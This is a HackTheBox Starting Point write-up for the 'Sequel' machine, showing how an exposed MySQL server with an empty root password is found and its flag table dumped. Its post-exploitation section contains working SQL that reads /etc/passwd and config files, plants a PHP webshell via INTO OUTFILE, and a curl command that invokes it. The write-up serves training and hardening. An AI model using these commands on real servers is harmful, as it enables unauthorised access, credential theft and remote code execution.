# Sequel

**Platform:** HackTheBox — Starting Point  
**Category:** Web Application Attacks  
**OS:** Linux  
**Difficulty:** Very Easy  
**Date:** 2025  

---

## Summary
This machine exposed a MySQL database service directly accessible 
on port 3306 with no password set for the root account. Connecting 
via the MySQL client without credentials gave full access to all 
databases where the flag was stored in a dedicated table.

---

## Recon

```bash
nmap -sV -sC 10.129.X.X -oN nmap.txt
```

Nmap revealed a MySQL database service running on port 3306 
directly exposed to the network.
```
3306/tcp open  mysql  MySQL 5.5.5-10.3.27-MariaDB
| mysql-empty-password:
|   root account has empty password
```
The Nmap default scripts immediately flagged that the root 
account has no password set — a critical misconfiguration.

---

## Enumeration
MySQL running on port 3306 exposed directly to the network 
is already a serious finding. Combined with an empty root 
password, no further enumeration was needed before attempting 
connection. The goal was to connect as root, list all databases, 
and search for the flag.

---

## Exploitation

**Step 1 — Connect to MySQL as root with no password**

```bash
mysql -h 10.129.X.X -u root
```

Connected immediately without being prompted for a password. 
Full root access to the database server granted.

**Step 2 — Enumerate all databases**

```sql
SHOW databases;
```

Output:
```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```
The `htb` database stood out as non-standard — all others 
are default MySQL system databases.

**Step 3 — Explore the htb database**

```sql
USE htb;

SHOW tables;
```

Output:
```
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```
Two tables — `config` and `users`. Both worth reading.

**Step 4 — Dump table contents**

```sql
SELECT * FROM config;
```

Output:
```
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | flag                  | redacted                         |
|  2 | some_other_setting    | some_value                       |
+----+-----------------------+----------------------------------+
```
The flag was stored directly in the config table.

Also dumped the users table:

```sql
SELECT * FROM users;
```

Output revealed usernames and password hashes — in a real 
engagement these would be cracked offline with Hashcat.

---

## Post-Exploitation
In a real penetration test, unauthenticated root access to 
MySQL opens several paths for deeper exploitation beyond 
reading database contents.

```sql
-- Read sensitive server files
SELECT load_file('/etc/passwd');
SELECT load_file('/var/www/html/config.php');

-- Write a webshell if web server is present
SELECT '<?php system($_GET["cmd"]); ?>' 
INTO OUTFILE '/var/www/html/shell.php';

-- Check current database user and hostname
SELECT user();
SELECT @@hostname;

-- Check file read/write privileges
SHOW GRANTS FOR 'root'@'localhost';
```

If the webshell write succeeds, remote code execution on 
the server is achieved via:

```bash
curl "http://10.129.X.X/shell.php?cmd=whoami"
```
---

## Key Lesson
This machine demonstrates two serious misconfigurations 
that are often found together in real environments — a 
database service exposed directly to the network, and 
a root account with no password set.

Database services like MySQL, PostgreSQL, MongoDB, and 
Redis should never be directly accessible from untrusted 
networks. They are designed to be accessed by application 
code running on the same server or internal network, not 
exposed on a public-facing interface. Finding port 3306 
open during an Nmap scan is always worth investigating 
immediately.

The empty root password compounds the exposure dramatically. 
MySQL ships with no root password by default and relies on 
administrators running mysql_secure_installation to set one 
after installation. Many systems are deployed without this 
hardening step, leaving the database completely open.

The real danger beyond reading data is the combination of 
MySQL root access and file system permissions. The 
load_file() function can read any file the MySQL process 
has access to — including application configuration files 
containing credentials for other services. The INTO OUTFILE 
function can write files to disk — including webshells that 
give remote code execution on the server.

In a real penetration test, finding an open database with 
weak or no credentials is a critical finding that typically 
leads to full server compromise when combined with file 
read and write capabilities.

The fix involves binding MySQL to localhost only using 
bind-address = 127.0.0.1 in my.cnf, always setting a 
strong root password during installation, running 
mysql_secure_installation on every new deployment, and 
restricting database user privileges to only what each 
application actually needs.
